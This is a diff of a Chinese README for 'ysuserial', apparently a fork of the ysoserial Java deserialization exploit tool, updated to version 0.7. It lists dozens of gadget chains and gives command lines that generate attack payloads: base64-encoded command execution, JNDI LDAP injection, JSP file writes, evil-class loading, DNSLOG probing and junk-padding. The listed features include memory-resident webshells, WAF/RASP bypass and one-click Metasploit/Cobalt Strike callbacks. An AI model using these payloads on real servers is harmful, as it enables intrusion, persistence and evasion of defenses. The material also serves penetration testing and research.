@@ -11,16 +11,16 @@ For English Speaker : [ReadMe_en.md](./ReadMe_en.md)
 3. 利用方式的填充：原版的利用链的利用方式仅使用了 Runtime 执行系统命令，本项目添加了多种利用方式，并支持执行自定义任意代码；
 4. 利用链探测：本项目在 URLDNS 中添加了利用链的探测，在攻击中不再盲目乱打，先通过 DNSLOG 检测类名，再执行攻击；
 5. 内存马：本项目在利用时，对于部分链支持了一键打入 Spring/Tomcat/Jetty/JBoss/Resin/Websphere 内存马功能，内存马支持命令执行、冰蝎、哥斯拉、WebSocket 四种利用方式；并支持 Tomcat
-   回显命令执行、Neoreg 流量隧道内存马；
+   回显命令执行、Neoreg 流量隧道内存马、Tomcat Websocket 内存马、Tomcat Executor 内存马、RMI 内存马等；
 6. 防御绕过：在部分系统中使用了 WAF/RASP 等防御模式，本项目去除大多数原版特征，并在执行恶意动作时使用了多种能够绕过 RASP 的执行方式，绕过防护；
 7. MSF/CS 上线：配合远程 Jar 包一键上线 MSF/CS 的功能，集成一体，快人一步；
-8. 使用去除编译类字节码行号、Javassist 动态添加父类等多种技术缩小反序列化 payload；
+8. 使用去除编译类字节码行号、Javassist 动态添加父类、接口、重写方法等多种技术缩小反序列化 payload；
 9. 支持使用随机集合类封装反序列化恶意类并填充随机长度字符来绕过流量层解析的功能。
 
 项目支持利用链展示：
 
 ```text
-$ java -jar ysuserial-0.6-su18-all.jar
+$ java -jar ysuserial-0.7-su18-all.jar
             _.-^^---....,,--
        _--                  --_
       <                        >)
@@ -36,60 +36,70 @@ $ java -jar ysuserial-0.6-su18-all.jar
      _____.,[ 直把杭州作汴州 ],._____
 [root]#~  A Mind-Blowing Tool Collected By [ su18@javaweb.org ]
 [root]#~  Shout Out to Yzmm / Shxjia / Y4er / N1nty / C0ny1 / Phith0n / Kezibei
-[root]#~  AND OF COURSE TO THE All MIGHTY @frohoff  
-[root]#~  Usage: java -jar ysuserial-0.6-su18-all.jar [payload] '[command]'
+[root]#~  AND OF COURSE TO THE All MIGHTY @frohoff
+[root]#~  Usage: java -jar ysoserial-0.7-su18-all.jar [payload] '[command]'
 [root]#~  Available payload types:
-Jun 19, 2022 11:54:53 PM org.reflections.Reflections scan
-INFO: Reflections took 195 ms to scan 1 urls, producing 26 keys and 230 values 
-     Payload                  Authors                                Dependencies                                                                                                                                                                                        
-     -------                  -------                                ------------                                                                                                                                                                                        
-     AspectJWeaver            @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
-     BeanShell1               @pwntester, @cschneider4711            bsh:2.0b5                                                                                                                                                                                           
-     C3P0                     @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           
-     C3P092                   @mbechler                              c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8, mchange-commons-java:0.2.11                                                                                                                                   
-     Click1                   @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                         
-     Clojure                  @JackOfMostTrades                      clojure:1.8.0                                                                                                                                                                                       
-     CommonsBeanutils1        @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
-     CommonsBeanutils1183NOCC                                        commons-beanutils:1.8.3                                                                                                                                                                             
-     CommonsBeanutils2                                               commons-beanutils:1.9.2                                                                                                                                                                             
-     CommonsBeanutils2NOCC                                           commons-beanutils:1.8.3, commons-logging:1.2                                                                                                                                                        
-     CommonsBeanutils3                                               commons-beanutils:1.9.2, commons-collections:3.1                                                                                                                                                    
-     CommonsBeanutils3183                                            commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
-     CommonsCollections1      @frohoff                               commons-collections:3.1                                                                                                                                                                             
-     CommonsCollections2      @frohoff                               commons-collections4:4.0                                                                                                                                                                            
-     CommonsCollections3      @frohoff                               commons-collections:3.1                                                                                                                                                                             
-     CommonsCollections4      @frohoff                               commons-collections4:4.0                                                                                                                                                                            
-     CommonsCollections5      @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                                             
-     CommonsCollections6      @matthias_kaiser                       commons-collections:3.1                                                                                                                                                                             
-     CommonsCollections6Lite  @matthias_kaiser                       commons-collections:3.1                                                                                                                                                                             
-     CommonsCollections7      @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                                             
-     CommonsCollections8      @navalorenzo                           commons-collections4:4.0                                                                                                                                                                            
-     CommonsCollections9                                             commons-collections:3.2.1                                                                                                                                                                           
-     FileUpload1              @mbechler                              commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                            
-     Groovy1                  @frohoff                               groovy:2.3.9                                                                                                                                                                                        
-     Hibernate1               @mbechler                                                                                                                                                                                                                                  
-     Hibernate2               @mbechler                                                                                                                                                                                                                                  
-     JBossInterceptors1       @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                            
-     JRE8u20                  @frohoff                                                                                                                                                                                                                                   
-     JRMPClient               @mbechler                                                                                                                                                                                                                                  
-     JRMPClient_Activator     @mbechler                                                                                                                                                                                                                                  
-     JRMPClient_Obj           @mbechler                                                                                                                                                                                                                                  
-     JRMPListener             @mbechler                                                                                                                                                                                                                                  
+Aug 13, 2022 7:19:27 AM org.reflections.Reflections scan
+INFO: Reflections took 194 ms to scan 1 urls, producing 26 keys and 205 values
+     Payload                  Authors                                Dependencies
+     -------                  -------                                ------------
+     AspectJWeaver            @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
+     BeanShell1               @pwntester, @cschneider4711            bsh:2.0b5
+     C3P0                     @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
+     C3P02                                                           c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35
+     C3P03                                                           c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, groovy:2.3.9
+     C3P04                                                           c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, snakeyaml:1.30
+     C3P092                   @mbechler                              c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8, mchange-commons-java:0.2.11
+     Click1                   @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
+     Clojure                  @JackOfMostTrades                      clojure:1.8.0
+     CommonsBeanutils1        @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
+     CommonsBeanutils1183NOCC                                        commons-beanutils:1.8.3
+     CommonsBeanutils2                                               commons-beanutils:1.9.2
+     CommonsBeanutils2NOCC                                           commons-beanutils:1.8.3, commons-logging:1.2
+     CommonsBeanutils3                                               commons-beanutils:1.9.2, commons-collections:3.1
+     CommonsBeanutils3183                                            commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
+     CommonsBeanutils4                                               commons-beanutils:1.9.2, commons-collections:3.1
+     CommonsCollections1      @frohoff                               commons-collections:3.1
+     CommonsCollections10                                            commons-collections:3.2.1
+     CommonsCollections2      @frohoff                               commons-collections4:4.0
+     CommonsCollections3      @frohoff                               commons-collections:3.1
+     CommonsCollections4      @frohoff                               commons-collections4:4.0
+     CommonsCollections5      @matthias_kaiser, @jasinner            commons-collections:3.1
+     CommonsCollections6      @matthias_kaiser                       commons-collections:3.1
+     CommonsCollections6Lite  @matthias_kaiser                       commons-collections:3.1
+     CommonsCollections7      @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
+     CommonsCollections8      @navalorenzo                           commons-collections4:4.0
+     CommonsCollections9                                             commons-collections:3.2.1
+     FileUpload1              @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
+     Groovy1                  @frohoff                               groovy:2.3.9
+     Hibernate1               @mbechler                              hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1
+     Hibernate2               @mbechler                              hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1
+     JBossInterceptors1       @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     JRE8u20                  @frohoff
+     JRMPClient               @mbechler
+     JRMPClient_Activator     @mbechler
+     JRMPClient_Obj           @mbechler
+     JRMPListener             @mbechler
      JSON1                    @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
-     JavassistWeld1           @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                        
-     Jdk7u21                  @frohoff                                                                                                                                                                                                                                   
-     Jython1                  @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                                                                                                             
-     MozillaRhino1            @matthias_kaiser                       js:1.7R2                                                                                                                                                                                            
-     MozillaRhino2            @_tint0                                js:1.7R2                                                                                                                                                                                            
-     Myfaces1                 @mbechler                                                                                                                                                                                                                                  
-     Myfaces2                 @mbechler                                                                                                                                                                                                                                  
-     ROME                     @mbechler                              rome:1.0                                                                                                                                                                                            
-     Spring1                  @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                               
-     Spring2                  @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           
-     Spring3                                                         spring-tx:5.2.3.RELEASE, spring-context:5.2.3.RELEASE, javax.transaction-api:1.2                                                                                                                    
-     URLDNS                   @gebl                                                                                                                                                                                                                                      
-     Vaadin1                  @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                          
-     Wicket1                  @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4  
+     JavassistWeld1           @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     Jdk7u21                  @frohoff
+     Jdk7u21variant           @potats0
+     Jython1                  @pwntester, @cschneider4711            jython-standalone:2.5.2
+     MozillaRhino1            @matthias_kaiser                       js:1.7R2
+     MozillaRhino2            @_tint0                                js:1.7R2
+     Myfaces1                 @mbechler
+     Myfaces2                 @mbechler                              myfaces-impl:2.2.9, myfaces-api:2.2.9, apache-el:8.0.27, javax.servlet-api:3.1.0, mockito-core:1.10.19, hamcrest-core:1.1, objenesis:2.1
+     RMIConnector
+     ROME                     @mbechler                              rome:1.0
+     ROME2                                                           rome:1.0
+     RenderedImage                                                   jai-codec-1.1.3
+     SignedObject
+     Spring1                  @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
+     Spring2                  @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
+     Spring3                                                         spring-tx:5.2.3.RELEASE, spring-context:5.2.3.RELEASE, javax.transaction-api:1.2
+     URLDNS                   @gebl
+     Vaadin1                  @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
+     Wicket1                  @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
 ```
 
 # 利用方式
@@ -123,7 +133,7 @@ ChainedTransformer 进行链式反射调用的利用方式，针对 CC 3.1-3.2.1
 **命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
+java -jar ysuserial-0.7-su18-all.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
 ```
 
 效果图：
@@ -133,7 +143,7 @@ java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxj
 **DNSLOG示例**：
 
 ```shell
-java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'DL-xxx.org'
+java -jar ysuserial-0.7-su18-all.jar CommonsCollections1 'DL-xxx.org'
 ```
 
 效果图：
@@ -143,7 +153,7 @@ java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'DL-xxx.org'
 **脚本引擎解析 JS 代码示例**：
 
 ```shell
-java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
+java -jar ysuserial-0.7-su18-all.jar CommonsCollections1 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
 ```
 
 效果图：
@@ -153,7 +163,7 @@ java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'SE-b3BlbiAtYSBDYWxjdWx
 **文件写入示例**：
 
 ```shell
-java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
+java -jar ysuserial-0.7-su18-all.jar CommonsCollections1 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
 ```
 
 效果图：
@@ -163,7 +173,7 @@ java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'WF-/tmp/1.jsp#PCVAcGFn
 **触发 JNDI 查询注入示例**：
 
 ```shell
-java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
+java -jar ysuserial-0.7-su18-all.jar CommonsCollections1 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
 ```
 
 效果图：
@@ -173,7 +183,7 @@ java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'JD-ldap://127.0.0.1:13
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'open -a Calculator.app'
+java -jar ysuserial-0.7-su18-all.jar CommonsCollections1 'open -a Calculator.app'
 ```
 
 效果图：
@@ -250,7 +260,7 @@ Tomcat Listener NeoReg 流量隧道：
 示例：
 
 ```shell
-java -jar ysuserial-0.6-su18-all.jar CommonsCollections3 LF-/tmp/evil.class
+java -jar ysuserial-0.7-su18-all.jar CommonsCollections3 LF-/tmp/evil.class
 ```
 
 效果图：
@@ -264,7 +274,7 @@ java -jar ysuserial-0.6-su18-all.jar CommonsCollections3 LF-/tmp/evil.class
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.6-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
+java -jar ysuserial-0.7-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
 ```
 
 效果图：
@@ -304,7 +314,7 @@ java -jar ysuserial-0.6-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
 示例：`all:xxxxxx.dns.log`
 
 ```shell
-java -jar ysuserial-0.6-su18-all.jar URLDNS 'all:xxxxxx.dns.log'
+java -jar ysuserial-0.7-su18-all.jar URLDNS 'all:xxxxxx.dns.log'
 ```
 
 效果图：
@@ -407,7 +417,7 @@ python neoreg.py -k su18 -u http://xxx.com/ -H 'Referer: https://su18.org/'
 例如：
 
 ```shell
-java -jar ysuserial-0.6-su18-all.jar CommonsBeanutils1 'EX-MS-TEXMSFromThread' 50000
+java -jar ysuserial-0.7-su18-all.jar CommonsBeanutils1 'EX-MS-TEXMSFromThread' 50000
 ```
 
 可以生成填充了 50000 个脏字符的序列化数据
